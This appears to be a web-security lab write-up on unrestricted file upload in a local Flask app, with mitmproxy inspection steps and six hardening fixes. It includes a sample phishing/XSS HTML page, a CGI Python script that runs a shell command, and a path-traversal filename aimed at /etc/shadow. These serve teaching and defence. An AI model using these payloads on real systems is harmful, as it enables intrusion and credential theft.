# Lab 06 — Unrestricted File Upload

## 📖 Explanation

**Unrestricted file upload** allows an attacker to upload arbitrary files
(including scripts, HTML pages, or executables) to the server.

When the uploaded file can be accessed via the web server, the attacker can:

- **Serve malicious HTML/JavaScript** (e.g., phishing pages, XSS vectors)
- **Execute server-side code** (e.g., `.py`, `.php`, `.jsp` files)
- **Overwrite existing files** if filenames are not validated
- **Fill the disk** via a denial-of-service upload

### The vulnerability

The `/upload` endpoint saves the uploaded file with its original filename,
without any validation of content type, extension, or size.

```python
f.save(os.path.join(UPLOAD_DIR, f.filename))
```

The uploaded files are then served at `/files/<filename>` **without** any
content-type restriction.

---

## 🎯 Try It

### 1. Upload a simple HTML file

Create a file called `evil.html`:

```html
<html>
<body>
  <h1>Phished!</h1>
  <form action="http://127.0.0.1:15000/profile" method="POST">
    <input name="email" value="attacker@evil.com">
    <button type="submit">Submit</button>
  </form>
  <script>alert('Your data has been stolen!')</script>
</body>
</html>
```

Upload it via `/upload`, then access it at:
`http://127.0.0.1:15000/files/evil.html`

### 2. Upload a Python script (server-side code)

Create `cmd.py`:

```python
import os
print("Content-Type: text/plain")
print()
print(os.popen("id").read())
```

Upload and access — Flask's dev server won't execute it as Python, but
if the app were served via Apache/NGINX + CGI, this would run.

### 3. Upload a file with the same name as an existing file

Upload a file named `hello.txt`, then upload another `hello.txt` — the
second overwrites the first. (No name collision handling.)

### 4. Try a huge file

Upload a very large file to see if there's a size limit (Flask dev server
has no default upload limit — this can crash the server).

---

## 🔍 Packet Inspection with mitmproxy

File upload is a great example of multipart form data on the wire.

### What to look for

**1. The upload request**

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:15000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabc123

------WebKitFormBoundaryabc123
Content-Disposition: form-data; name="file"; filename="evil.html"
Content-Type: text/html

<html>
<body>
  <h1>Phished!</h1>
  <script>alert('XSS')</script>
</body>
</html>
------WebKitFormBoundaryabc123--
```

Notice:
- The `Content-Type` header says `text/html` — but the app never checks it.
- The `filename` is attacker-controlled — could be `../../../etc/shadow`.
- The entire file content is visible in the body.

**2. Accessing the uploaded file**

```http
GET /files/evil.html HTTP/1.1
Host: 127.0.0.1:15000
```

**3. The response**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: ...

<html>... (your uploaded HTML)
```

The file is served with its original content and a generic `text/html` type.
There is **no** `Content-Disposition: attachment` header, so the browser
renders it as a live web page.

### What to check in the response

| Header | Current | Should be |
|--------|---------|-----------|
| `Content-Type` | Whatever the file extension triggers | Specific to expected type (e.g. `image/jpeg`) |
| `Content-Disposition` | Missing | `attachment; filename="..."` |
| `X-Content-Type-Options` | Missing | `nosniff` |

### Use the addon

```bash
uv run mitmweb -s mitm_addon.py    # identical in PowerShell — uv resolves the venv
```

The addon audits all responses for missing security headers including
`X-Content-Type-Options`.

---

## 🛡️ Hardening

### Fix 1 — Validate file extension (whitelist approach)

```python
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}

def allowed_file(filename):
    _, ext = os.path.splitext(filename.lower())
    return ext in ALLOWED_EXTENSIONS
```

### Fix 2 — Validate content type (magic bytes)

Don't trust the `Content-Type` header — check magic bytes:

```python
import magic

def is_image(file_bytes):
    mime = magic.from_buffer(file_bytes, mime=True)
    return mime.startswith('image/')
```

### Fix 3 — Rename files to safe names

Never use the user-supplied filename. Generate a UUID-based name and store
the original name in a database:

```python
import uuid

safe_name = str(uuid.uuid4()) + os.path.splitext(f.filename)[1]
f.save(os.path.join(UPLOAD_DIR, safe_name))
```

### Fix 4 — Serve uploaded files from a different origin/domain

Upload to a separate hostname or a CDN that processes content.
Even better: serve uploaded media from a separate domain with no
server-side scripting enabled.

### Fix 5 — Set upload size limits

```python
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # 5 MB
```

### Fix 6 — Store files outside the web root

```python
UPLOAD_DIR = "/var/data/uploads/"  # NOT inside the web root
```

Then serve them via a dedicated handler that sets proper `Content-Type`
headers and `Content-Disposition: attachment` to prevent browser execution.

### Key takeaway

> Never trust file uploads. Whitelist extensions, validate content,
> rename files, and serve them with safe headers.